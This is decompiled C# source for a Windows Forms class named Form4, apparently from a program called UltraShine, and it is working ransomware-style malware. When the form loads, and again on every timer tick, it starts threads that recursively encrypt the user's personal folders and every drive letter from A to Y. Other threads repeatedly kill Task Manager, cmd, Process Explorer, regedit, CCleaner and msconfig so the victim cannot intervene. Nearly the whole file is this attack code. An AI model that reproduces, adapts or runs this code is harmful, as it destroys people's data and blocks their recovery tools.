using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace UltraShine
{
	// Token: 0x0200000E RID: 14
	[DesignerGenerated]
	public partial class Form4 : Form
	{
		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600006C RID: 108 RVA: 0x00003B39 File Offset: 0x00001D39
		// (set) Token: 0x0600006D RID: 109 RVA: 0x00003B44 File Offset: 0x00001D44
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600006E RID: 110 RVA: 0x00002587 File Offset: 0x00000787
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		// Token: 0x0600006F RID: 111
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

		// Token: 0x06000070 RID: 112
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		// Token: 0x06000071 RID: 113
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vkey);

		// Token: 0x06000072 RID: 114 RVA: 0x00003B87 File Offset: 0x00001D87
		public Form4()
		{
			base.Load += this.Form4_Load;
			this.erhaltenerText = new RichTextBox();
			this.userDir = "C:\\\\Users\\\\";
			this.InitializeComponent();
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00003BC0 File Offset: 0x00001DC0
		public void crypt2()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), array);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00003BE8 File Offset: 0x00001DE8
		public void crypt3()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), array);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00003C10 File Offset: 0x00001E10
		public void crypt4()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), array);
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00003C38 File Offset: 0x00001E38
		public void crypt5()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), array);
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00003C60 File Offset: 0x00001E60
		public void crypt6()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("C:\\Users\\" + Environment.UserName + "\\Contacts\\", array);
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00003C94 File Offset: 0x00001E94
		public void crypt7()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("C:\\Users\\" + Environment.UserName + "\\Downloads\\", array);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00003CC8 File Offset: 0x00001EC8
		public void crypt8()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Conversions.ToString(RuntimeHelpers.GetObjectValue(this.userDir)), array);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00003CF8 File Offset: 0x00001EF8
		public void crypt35()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("C:\\Users\\" + Environment.UserName + "\\OneDrive\\", array);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x00003D2C File Offset: 0x00001F2C
		public void crypt()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), array);
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00003D54 File Offset: 0x00001F54
		public void crypt11()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("A:\\", array);
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00003D78 File Offset: 0x00001F78
		public void crypt12()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("B:\\", array);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00003D9C File Offset: 0x00001F9C
		public void crypt13()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("D:\\", array);
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00003DC0 File Offset: 0x00001FC0
		public void crypt14()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("E:\\", array);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00003DE4 File Offset: 0x00001FE4
		public void crypt15()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("F:\\", array);
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00003E08 File Offset: 0x00002008
		public void crypt16()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("G:\\", array);
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00003E2C File Offset: 0x0000202C
		public void crypt17()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("H:\\", array);
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00003E50 File Offset: 0x00002050
		public void crypt18()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("I:\\", array);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00003E74 File Offset: 0x00002074
		public void crypt19()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("J:\\", array);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00003E98 File Offset: 0x00002098
		public void crypt20()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("K:\\", array);
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00003EBC File Offset: 0x000020BC
		public void crypt21()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("L:\\", array);
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00003EE0 File Offset: 0x000020E0
		public void crypt22()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("M:\\", array);
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00003F04 File Offset: 0x00002104
		public void crypt23()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("N:\\", array);
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00003F28 File Offset: 0x00002128
		public void crypt24()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("O:\\", array);
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00003F4C File Offset: 0x0000214C
		public void crypt25()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("P:\\", array);
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00003F70 File Offset: 0x00002170
		public void crypt26()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("Q:\\", array);
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00003F94 File Offset: 0x00002194
		public void crypt27()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("R:\\", array);
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00003FB8 File Offset: 0x000021B8
		public void crypt28()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("S:\\", array);
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00003FDC File Offset: 0x000021DC
		public void crypt29()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("T:\\", array);
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00004000 File Offset: 0x00002200
		public void crypt30()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("U:\\", array);
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00004024 File Offset: 0x00002224
		public void crypt31()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("V:\\", array);
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00004048 File Offset: 0x00002248
		public void crypt32()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("W:\\", array);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000406C File Offset: 0x0000226C
		public void crypt33()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("X:\\", array);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00004090 File Offset: 0x00002290
		public void crypt34()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("Y:\\", array);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000040B4 File Offset: 0x000022B4
		public void crypt9()
		{
			byte[] array = AES.AES.generateKey();
			new RSACryptoServiceProvider();
			Form4.encryptAll("C:\\", array);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000040D8 File Offset: 0x000022D8
		private static void encryptAll(string dir, byte[] aesKey)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(dir);
			checked
			{
				try
				{
					FileInfo[] files = directoryInfo.GetFiles("*.*");
					int num = files.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						CryptFile.encryptFile(files[i].FullName, aesKey);
					}
					DirectoryInfo[] directories = directoryInfo.GetDirectories();
					int num2 = directories.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Form4.encryptAll(directories[j].FullName, aesKey);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x0000417C File Offset: 0x0000237C
		private void Form4_Load(object sender, EventArgs e)
		{
			new Thread(new ThreadStart(this.crypt)).Start();
			new Thread(new ThreadStart(this.crypt2)).Start();
			new Thread(new ThreadStart(this.crypt3)).Start();
			new Thread(new ThreadStart(this.crypt4)).Start();
			new Thread(new ThreadStart(this.crypt5)).Start();
			new Thread(new ThreadStart(this.crypt6)).Start();
			new Thread(new ThreadStart(this.crypt7)).Start();
			new Thread(new ThreadStart(this.crypt8)).Start();
			new Thread(new ThreadStart(this.crypt9)).Start();
			new Thread(new ThreadStart(this.crypt35)).Start();
			try
			{
				new Thread(new ThreadStart(this.crypt9)).Start();
			}
			catch (Exception ex)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt11)).Start();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt12)).Start();
			}
			catch (Exception ex3)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt13)).Start();
			}
			catch (Exception ex4)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt14)).Start();
			}
			catch (Exception ex5)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt15)).Start();
			}
			catch (Exception ex6)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt16)).Start();
			}
			catch (Exception ex7)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt17)).Start();
			}
			catch (Exception ex8)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt18)).Start();
			}
			catch (Exception ex9)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt19)).Start();
			}
			catch (Exception ex10)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt20)).Start();
			}
			catch (Exception ex11)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt21)).Start();
			}
			catch (Exception ex12)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt22)).Start();
			}
			catch (Exception ex13)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt23)).Start();
			}
			catch (Exception ex14)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt24)).Start();
			}
			catch (Exception ex15)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt25)).Start();
			}
			catch (Exception ex16)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt26)).Start();
			}
			catch (Exception ex17)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt27)).Start();
			}
			catch (Exception ex18)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt28)).Start();
			}
			catch (Exception ex19)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt29)).Start();
			}
			catch (Exception ex20)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt30)).Start();
			}
			catch (Exception ex21)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt31)).Start();
			}
			catch (Exception ex22)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt32)).Start();
			}
			catch (Exception ex23)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt33)).Start();
			}
			catch (Exception ex24)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.crypt34)).Start();
			}
			catch (Exception ex25)
			{
			}
			try
			{
				new Thread(new ThreadStart(this.block)).Start();
				new Thread(new ThreadStart(this.block2)).Start();
				new Thread(new ThreadStart(this.block3)).Start();
				new Thread(new ThreadStart(this.block4)).Start();
				new Thread(new ThreadStart(this.block5)).Start();
				new Thread(new ThreadStart(this.block6)).Start();
				new Thread(new ThreadStart(this.block7)).Start();
			}
			catch (Exception ex26)
			{
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00004968 File Offset: 0x00002B68
		public void block()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("taskmgr");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000049C0 File Offset: 0x00002BC0
		public void block2()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("cmd");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00004A18 File Offset: 0x00002C18
		public void block3()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("procexp");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00004A70 File Offset: 0x00002C70
		public void block4()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("procexp64");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00004AC8 File Offset: 0x00002CC8
		public void block5()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("regedit");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00004B20 File Offset: 0x00002D20
		public void block6()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("CCleaner64");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00004B78 File Offset: 0x00002D78
		public void block7()
		{
			checked
			{
				try
				{
					for (;;)
					{
						Process[] processesByName = Process.GetProcessesByName("msconfig");
						for (int i = 0; i < processesByName.Length; i++)
						{
							processesByName[i].Kill();
						}
						Thread.Sleep(100);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00004BD0 File Offset: 0x00002DD0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				new Thread(new ThreadStart(this.crypt)).Start();
				new Thread(new ThreadStart(this.crypt2)).Start();
				new Thread(new ThreadStart(this.crypt3)).Start();
				new Thread(new ThreadStart(this.crypt4)).Start();
				new Thread(new ThreadStart(this.crypt5)).Start();
				new Thread(new ThreadStart(this.crypt6)).Start();
				new Thread(new ThreadStart(this.crypt7)).Start();
				new Thread(new ThreadStart(this.crypt8)).Start();
				new Thread(new ThreadStart(this.crypt9)).Start();
				new Thread(new ThreadStart(this.crypt35)).Start();
				try
				{
					new Thread(new ThreadStart(this.crypt9)).Start();
				}
				catch (Exception ex)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt11)).Start();
				}
				catch (Exception ex2)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt12)).Start();
				}
				catch (Exception ex3)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt13)).Start();
				}
				catch (Exception ex4)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt14)).Start();
				}
				catch (Exception ex5)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt15)).Start();
				}
				catch (Exception ex6)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt16)).Start();
				}
				catch (Exception ex7)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt17)).Start();
				}
				catch (Exception ex8)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt18)).Start();
				}
				catch (Exception ex9)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt19)).Start();
				}
				catch (Exception ex10)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt20)).Start();
				}
				catch (Exception ex11)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt21)).Start();
				}
				catch (Exception ex12)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt22)).Start();
				}
				catch (Exception ex13)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt23)).Start();
				}
				catch (Exception ex14)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt24)).Start();
				}
				catch (Exception ex15)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt25)).Start();
				}
				catch (Exception ex16)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt26)).Start();
				}
				catch (Exception ex17)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt27)).Start();
				}
				catch (Exception ex18)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt28)).Start();
				}
				catch (Exception ex19)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt29)).Start();
				}
				catch (Exception ex20)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt30)).Start();
				}
				catch (Exception ex21)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt31)).Start();
				}
				catch (Exception ex22)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt32)).Start();
				}
				catch (Exception ex23)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt33)).Start();
				}
				catch (Exception ex24)
				{
				}
				try
				{
					new Thread(new ThreadStart(this.crypt34)).Start();
				}
				catch (Exception ex25)
				{
				}
			}
			catch (Exception ex26)
			{
			}
		}

		// Token: 0x04000054 RID: 84
		public const int VK_LWIN = 91;

		// Token: 0x04000055 RID: 85
		public const int KEYEVENTF_KEYUP = 2;

		// Token: 0x04000056 RID: 86
		private int i;

		// Token: 0x04000057 RID: 87
		private int i2;

		// Token: 0x04000058 RID: 88
		private int i3;

		// Token: 0x04000059 RID: 89
		private int i4;

		// Token: 0x0400005A RID: 90
		private int i5;

		// Token: 0x0400005B RID: 91
		private new string Location;

		// Token: 0x0400005C RID: 92
		private const int SETDESKWALLPAPER = 20;

		// Token: 0x0400005D RID: 93
		private const int UPDATEINIFILE = 1;

		// Token: 0x0400005E RID: 94
		private RichTextBox erhaltenerText;

		// Token: 0x0400005F RID: 95
		private string path1;

		// Token: 0x04000060 RID: 96
		private string path2;

		// Token: 0x04000061 RID: 97
		private object userDir;

		// Token: 0x04000062 RID: 98
		private static List<WeakReference> __ENCList = new List<WeakReference>();
	}
}
